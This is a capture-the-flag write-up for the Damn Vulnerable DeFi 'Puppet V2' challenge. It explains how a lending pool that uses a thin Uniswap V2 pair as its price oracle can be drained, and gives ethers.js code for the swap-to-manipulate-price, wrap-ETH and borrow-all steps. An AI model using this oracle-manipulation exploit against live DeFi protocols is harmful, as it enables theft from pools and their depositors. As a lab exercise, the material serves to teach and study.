### [Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/puppet-v2)
### Task
>The developers of the previous pool seem to have learned the lesson. And released a new version!

>Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

>You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do.

### Observations

*Please refer to previous challenge [Puppet](https://github.com/CharlieJRBenson/SmartContractHacking/tree/main/DamnVulnerableDefi/Puppet) for context*

- This pool differs due to it's use of UniswapV2, the Uniswap Router and the use of WETH instead of ETH.

- However the same principle stands as the pools use of the oracle relies on the stability of the liquidity pool.

- I have 20Eth and 10,000DVT.
- The Uniswap LP has 10 Eth and 100DVT.

- The UniswapV2 liquidity balance mechanism is based on product, e.g:
```
x * y = k
where:
x & y are the pair's reserve balances.
k is the product.
```

- With a huge increase in x, will be a huge decrease in y. And a manipulation of the price will occur.

- If we swap our 10,000DVT for the LP's Eth, the pool will have 10,100DVT and approx 0.099Eth.

- Hugely affecting the ratios, and therefore cost of DVT -> Which will lead to a much cheaper required deposit to borrow DVT from the lender pool.

### Steps 

- No need for a smart contract to do this, though it is advised as it enables the exploit to be performed in a single transaction.

- Swap all our DVT for WETH in the UniswapV2 LP:
```
//appove exchange to spend my tokens
await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);

//Swap all DVT for Weth in pool, devaluing DVT.
await uniswapRouter.connect(player).swapExactTokensForTokens(
    PLAYER_INITIAL_TOKEN_BALANCE,
    1,
    [token.address, weth.address],
    player.address,
    (await ethers.provider.getBlock('latest')).timestamp * 2,
)
```

- Wrap some more Eth to WETH, as lender pool only receives WETH now:

```
//Wrap my ETH to WETH
await weth.connect(player).deposit({ value: ethers.utils.parseEther('19.6') });
```

- Get lender pools required deposit to withdraw ALL the DVT tokens (now price has been manipulated):
```
//get new manipulated eth depositRequired from pool
depositRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
```

- Borrow all the lenders tokens in exchange for WETH:
```
//appove exchange to spend my WETH
await weth.connect(player).approve(lendingPool.address, depositRequired);

//borrow all DVT from lending pool.
await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
```